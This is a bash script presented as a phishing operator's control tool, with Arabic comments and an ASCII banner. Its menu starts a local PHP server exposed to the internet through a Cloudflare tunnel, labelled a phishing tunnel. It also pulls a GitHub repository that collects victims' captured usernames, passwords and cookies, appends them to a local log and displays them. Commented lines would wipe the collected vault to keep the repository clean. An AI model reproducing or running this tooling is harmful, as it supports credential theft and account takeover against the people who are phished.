#!/bin/bash
# Crimson Tool - Chief Edition (Auto-Logger)

RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'

# وظيفة لسحب البيانات وتحديث الملف المحلي
update_logs() {
    echo -e "${GREEN}[*] Checking for new captures...${NC}"
    git pull origin main --quiet
    if [ -f "vault.txt" ]; then
        # نسخ البيانات لملف الصيد الخاص بك في كالي
        cat vault.txt >> captures_log.txt
        # تنظيف الملف في جيت هاب عشان المستودع يفضل نظيف (اختياري)
        # > vault.txt
        # git add vault.txt && git commit -m "Logs Synced" --quiet && git push origin main --quiet
        echo -e "${GREEN}[+] New data saved to: captures_log.txt${NC}"
    else
        echo -e "${RED}[!] No data found yet.${NC}"
    fi
}

clear
echo -e "${RED}"
echo "██████╗  ██████╗ ██████╗ ██╗      ██████╗ ██╗  ██╗"
echo "██╔══██╗██╔═══██╗██╔══██╗██║     ██╔═══██╗╚██╗██╔╝"
echo "██████╔╝██║   ██║██████╔╝██║     ██║   ██║ ╚███╔╝ "
echo "██╔══██╗██║   ██║██╔══██╗██║     ██║   ██║ ██╔██╗ "
echo "██║  ██║╚██████╔╝██████╔╝███████╗╚██████╔╝██╔╝ ██╗"
echo "╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝"
echo "             CHIEF OF CYBER SECURITY             "
echo -e "${NC}"

echo -e "${RED}[1] Start Phishing Tunnel (Cloudflared)${NC}"
echo -e "${RED}[2] Sync & View Captured Data (User/Pass/Cookie)${NC}"
echo -e "${RED}[0] Exit${NC}"
echo -e "${RED}------------------------------------------------${NC}"
read -p "Select: " choice

case $choice in
    1)
        # تشغيل السيرفر المحلي ونفق كلاود فلير
        php -S 127.0.0.1:8080 > /dev/null 2>&1 &
        sleep 2
        cloudflared tunnel --url http://127.0.0.1:8080
        ;;
    2)
        update_logs
        echo -e "${RED}--- CURRENT LOGS ---${NC}"
        column -t -s "|" captures_log.txt
        ;;
    0)
        exit 0
        ;;
    *)
        bash sync.sh
        ;;
esac
